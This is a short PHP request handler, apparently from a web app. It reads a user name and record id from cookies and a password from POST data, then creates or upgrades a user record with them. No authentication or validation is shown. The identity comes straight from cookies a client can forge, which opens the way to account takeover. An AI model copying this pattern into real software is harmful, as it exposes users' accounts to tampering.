<?php 
require('../../metronic/include/setings.php');

$usr = $_COOKIE['usr'];
$pass = $_POST['pass'];
$device = $_POST['dvc'];

if (isset($_COOKIE['id'])) {
	$id = $_COOKIE['id'];
	upgrade_user($usr,$pass,$id);
}else{
	create_item($usr,$pass,$device);	
}


?>